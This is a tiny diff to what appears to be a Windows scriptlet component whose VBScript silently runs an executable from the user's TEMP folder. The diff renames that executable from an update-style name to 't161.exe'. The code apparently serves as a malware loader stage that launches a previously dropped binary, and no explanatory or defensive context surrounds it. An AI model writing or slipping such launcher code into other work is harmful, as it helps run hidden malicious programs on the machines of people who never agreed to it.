@@ -1,6 +1,6 @@
 <component>
 <script language="VBScript">
 Set shell=CreateObject("wscript.shell")
-shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\ChannelupdateJI_v3.exe")
+shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\t161.exe")
 </script>
 </component>
